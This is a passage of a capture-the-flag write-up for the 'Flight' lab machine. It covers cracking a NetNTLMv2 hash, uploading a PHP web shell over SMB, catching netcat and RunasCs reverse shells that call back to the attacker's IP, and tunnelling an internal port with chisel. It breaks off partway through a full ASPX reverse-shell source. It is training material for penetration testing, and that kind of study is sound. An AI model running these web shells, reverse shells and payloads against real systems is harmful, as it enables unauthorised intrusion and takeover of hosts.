If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.                
                                                                                 
Watchdog: Temperature abort trigger set to 90c
                                                                                 
Host memory allocated for this attack: 513 MB (1107 MB free)

Dictionary cache hit:                                                            
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507                                                                                                                                           * Keyspace..: 14344385                                                                                                                                                                                                                                                                                                              Cracking performance lower than expected?                                                                                                                                                                                                          
* Append -O to the commandline.                                                  
  This lowers the maximum supported password/salt length (usually down to 32).
                                        
* Append -w 3 to the commandline.  
  This can cause your screen to lag.                                             
                                                                                 
* Append -S to the commandline.                                                  
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.
                                        
* Update your backend API runtime / driver the right way:                 
  https://hashcat.net/faq/wrongdriver                                            
                                                                                 
* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework                                               
                                                                                 
C.BUM::flight.htb:38894e439e82e1c8:bf876978f9006474a6084815b354b748:010100000000000000a0a13eda76dc01be17ca584b1138cb0000000002000800310050005a004f0001001e00570049
004e002d0041004300460049005a0052004300450033003500300004003400570049004e002d0041004300460049005a005200430045003300350030002e00310050005a004f002e004c004f0043004100
4c0003001400310050005a004f002e004c004f00430041004c0005001400310050005a004f002e004c004f00430041004c000700080000a0a13eda76dc0106000400020000000800300030000000000000
0000000000003000000edc72611d688971bbe32d4fae2d9a9c102bbb6c5d24ba3309a9566dca4bec6b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00
310030002e00310034002e003100370039000000000000000000:Tikkycoll_431012284
                                                           
Session..........: hashcat
Status...........: Cracked            
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: C.BUM::flight.htb:38894e439e82e1c8:bf876978f9006474...000000
Time.Started.....: Sat Dec 27 02:44:35 2025 (18 secs)
Time.Estimated...: Sat Dec 27 02:44:53 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   586.4 kH/s (2.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Thelittlemermaid
Hardware.Mon.#01.: Util: 60%

Started: Sat Dec 27 02:44:33 2025
Stopped: Sat Dec 27 02:44:55 2025
```

:::info NTLMv2 Hash Cracked
I got a new set of credentials, `c.bum:Tikkycoll_431012284`
:::

### Web Shell & Remote Code Execution

I went back to SMB to check what `c.bum` brought to the table.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight/ntlm_theft/test]
└─$ nxc smb 10.129.228.120 -u c.bum -p 'Tikkycoll_431012284' -d flight --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight\c.bum:Tikkycoll_431012284 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```

`c.bum` has `WRITE` access to the Web share. This share maps directly to the web root I enumerated earlier (school.flight.htb). My immediate thought was to upload a PHP web shell and get command execution.

I created a simple PHP shell:

```php title="shell.php"
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

I uploaded it to the `school.flight.htb` directory via SMB.

```plaintext {1}
smb: \school.flight.htb\> put shell.php
putting file shell.php as \school.flight.htb\shell.php (0.8 kB/s) (average 52.5 kB/s)
```

And then accessed `http://school.flight.htb/shell.php?cmd=whoami` on the web.

<FakeBrowserFrame url="http://school.flight.htb/shell.php?cmd=whoami">
  
</FakeBrowserFrame>

This confirmed the fact that I can execute commands as user `svc_apache`.

:::info Context
Even though I used `c.bum`'s credentials to upload the file, the web server itself is running as the service account `svc_apache`. I have a shell, but I'm technically still the "wrong" user to get the user flag.
:::

To get a proper reverse shell, I uploaded `nc64.exe` via SMB.

```plaintext {1}
smb: \school.flight.htb\> put nc64.exe
putting file nc64.exe as \school.flight.htb\nc64.exe (191.4 kB/s) (average 98.7 kB/s)
```

Set a `nc` listener on my attacker machine

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
```

And then triggered it via the web shell, running `nc64.exe -e powershell 10.10.14.179 1337` from there.

<FakeBrowserFrame url="http://school.flight.htb/shell.php?cmd=nc64.exe%20-e%20powershell%2010.10.14.179%201337">
</FakeBrowserFrame>

:::info
%20 in a URL is the URL-encoded representation of a space character.
:::

```plaintext {1,2,8}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.14.179] from (UNKNOWN) [10.129.228.120] 58698
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\school.flight.htb> whoami
whoami
flight\svc_apache
```

:::note Raw Shell Artifacts
You might have noticed commands appearing twice in the output. Throughout this writeup, commands will continue to be duplicated because we are using a **raw shell** without a proper TTY. The remote shell echoes our input back, and without a terminal interface to handle it, we see it repeated.
:::

This caught a shell on my listener.

### Lateral Movement to C.Bum

I needed to switch to `c.bum` to get to the user flag. Since I have `c.bum`'s credentials, I used `RunasCs.exe` (a handy tool to spawn processes as another user) to bypass the profile loading restrictions that sometimes plague built-in `runas`.

:::tip Why RunasCs?
The standard Windows `runas.exe` command often fails in reverse shells because it requires an interactive password prompt and does not handle Input/Output redirection properly. `RunasCs` solves this by accepting the password as an argument and managing the I/O pipes for the new user session.
:::

I hosted [RunasCs](https://github.com/antonioCoco/RunasCs) on my attacker machine using a python http server 

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.228.120 - - [27/Dec/2025 05:25:47] "GET /RunasCs.exe HTTP/1.1" 200 -
```

And from the `svc_apache` shell, I used `curl` to download it to the target.

```plaintext {1,3}
PS C:\xampp\htdocs\school.flight.htb> curl http://10.10.14.179:8000/RunasCs.exe -o RunasCs.exe
curl http://10.10.14.179:8000/RunasCs.exe -o RunasCs.exe
PS C:\xampp\htdocs\school.flight.htb> ls
ls


    Directory: C:\xampp\htdocs\school.flight.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/27/2025   9:22 AM                images                                                                
d-----       12/27/2025   9:22 AM                styles                                                                
-a----       10/24/2022   8:54 PM           1689 about.html                                                            
-a----       10/24/2022   8:53 PM           3618 blog.html                                                             
-a----       10/24/2022   8:56 PM           2683 home.html                                                             
-a----       10/27/2022  12:59 AM           2092 index.php                                                             
-a----       10/27/2022  12:55 AM            179 lfi.html                                                              
-a----       12/27/2025   9:24 AM          45272 nc64.exe                                                              
-a----       12/27/2025   9:25 AM          51712 RunasCs.exe                                                           
-a----       12/27/2025   9:24 AM            114 shell.php
```

Now, I will run `RunasCs.exe` with `c.bum`'s credentials and use the `-r` switch to redirect to my attacker machine without using `nc`.

```plaintext {1}
PS C:\xampp\htdocs\school.flight.htb> .\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.179:4444
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.179:4444
[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-85663$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2544 created in background.
```

Returning to my `nc` listener I can see that I got a shell as the `c.bum` user.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.179] from (UNKNOWN) [10.129.228.120] 56846
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
flight\c.bum
```

:::success User Pwned
We have successfully compromised `c.bum`'s account.
:::

I navigated to his Desktop and grabbed the user flag.

```plaintext {1}
PS C:\Users\C.Bum\Desktop> cat user.txt
cat user.txt
9aee9e1d************************
```

---

## Privilege Escalation

Let's find out more about this user.

```plaintext {1,13}
PS C:\inetpub> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\inetpub> net user C.Bum
net user C.Bum
User name                    C.Bum
Full Name                    
Comment                      Senior Web Developer
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/22/2022 12:08:22 PM
Password expires             Never
Password changeable          9/23/2022 12:08:22 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/27/2025 12:15:59 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *WebDevs              
The command completed successfully.
```

He is part of the `WebDevs` group.

Looking around, I found an interesting directory, `C:\inetpub\development`

```plaintext {1}
PS C:\inetpub\development> ls
ls


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/27/2025  12:37 PM                css                                                                   
d-----       12/27/2025  12:37 PM                fonts                                                                 
d-----       12/27/2025  12:37 PM                img                                                                   
d-----       12/27/2025  12:37 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html
```

I interpret this directory as evidence of an active web server I haven't enumerated yet. Since my external `nmap` scan missed it, I assume it is running on a non-standard port hidden behind the host firewall.

I'll have to verify.

### Internal Reconnaissance

```plaintext {1}
PS C:\Windows\system32> netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5232
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5232
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2932
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1168
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1640
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       3008
  TCP    0.0.0.0:49725          0.0.0.0:0              LISTENING       3016
  TCP    10.129.228.120:53      0.0.0.0:0              LISTENING       3008
  TCP    10.129.228.120:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3008
  TCP    [::]:80                [::]:0                 LISTENING       5232
  TCP    [::]:88                [::]:0                 LISTENING       648
  TCP    [::]:135               [::]:0                 LISTENING       912
  TCP    [::]:389               [::]:0                 LISTENING       648
  TCP    [::]:443               [::]:0                 LISTENING       5232
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       648
  TCP    [::]:593               [::]:0                 LISTENING       912
  TCP    [::]:636               [::]:0                 LISTENING       648
  TCP    [::]:3268              [::]:0                 LISTENING       648
  TCP    [::]:3269              [::]:0                 LISTENING       648
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8000              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2932
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       496
  TCP    [::]:49665             [::]:0                 LISTENING       1168
  TCP    [::]:49666             [::]:0                 LISTENING       1640
  TCP    [::]:49667             [::]:0                 LISTENING       648
  TCP    [::]:49673             [::]:0                 LISTENING       648
  TCP    [::]:49674             [::]:0                 LISTENING       648
  TCP    [::]:49683             [::]:0                 LISTENING       636
  TCP    [::]:49695             [::]:0                 LISTENING       3008
  TCP    [::]:49725             [::]:0                 LISTENING       3016
  TCP    [::1]:53               [::]:0                 LISTENING       3008
  TCP    [dead:beef::c93d:c047:7530:7e3f]:53  [::]:0                 LISTENING       3008
  TCP    [fe80::c93d:c047:7530:7e3f%6]:53  [::]:0                 LISTENING       3008
```

I checked for internal ports listening and found port 8000, this must be the development site I'm interested in.

### Pivoting with Chisel

To investigate, I'll set up a [chisel](https://github.com/jpillora/chisel) tunnel to forward internal port 8000 from the victim to my attacker machine.

I'll start my `chisel` server on my attacker machine first.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ ./chisel server --port 8000 --reverse
2025/12/27 10:10:11 server: Reverse tunnelling enabled
2025/12/27 10:10:11 server: Fingerprint ens8caIqqjhFerZf2P6vI0ttzj8LLBPrllkIoHuVzwE=
2025/12/27 10:10:11 server: Listening on http://0.0.0.0:8000
```

Then I'll put `chisel` on the target and start the client
```plaintext {1,4}
PS C:\ProgramData> curl http://10.10.14.179:8000/chisel.exe -o chisel.exe
curl http://10.10.14.179:8000/chisel.exe -o chisel.exe

PS C:\ProgramData> .\chisel.exe client 10.10.14.179:8000 R:8001:127.0.0.1:8000
.\chisel.exe client 10.10.14.179:8000 R:8001:127.0.0.1:8000
2025/12/27 14:20:36 client: Connecting to ws://10.10.14.179:8000
2025/12/27 14:20:36 client: Connected (Latency 47.7141ms)
```

Now I should be able to visit http://127.0.0.1:8001 in Firefox on my attacker machine and view the site
<FakeBrowserFrame url="http://127.0.0.1:8001">
  
</FakeBrowserFrame>

It is indeed the development site I've been looking for. Let's see the permissions `c.bum` has on that development directory

### Lateral Movement to IIS AppPool

```plaintext {1}
PS C:\inetpub\development> icacls c:\inetpub\development
icacls c:\inetpub\development
c:\inetpub\development flight\C.Bum:(OI)(CI)(W)
                       NT SERVICE\TrustedInstaller:(I)(F)
                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
                       NT AUTHORITY\SYSTEM:(I)(F)
                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                       BUILTIN\Users:(I)(RX)
                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

We can see that `c.bum` has write (W) permissions into the web root, meaning we can write anything into the website, and by anything I mean a reverse shell. 

Since inetpub usually hosts IIS (ASP.NET) applications, and I have write access to the directory serving that port, I could upload a malicious ASPX shell.

:::warning Payload Size
The ASPX reverse shell code below is lengthy. In a real engagement, you might use `msfvenom` to generate a smaller payload (`msfvenom -f aspx`), but a custom script often helps evade basic AV signatures.
:::

Here is my revshell.aspx:
<details>
<summary>Click to expand revshell.aspx</summary>
```plaintext title="revshell.aspx"
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
        protected void Page_Load(object sender, EventArgs e)
    {
            String host = "10.10.14.179"; //CHANGE THIS
            int port = 8002; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,
        uint dwOpenMode,
        uint dwPipeMode,
        uint nMaxInstances,
        uint nOutBufferSize,
        uint nInBufferSize,
        uint nDefaultTimeOut,
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
 
    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
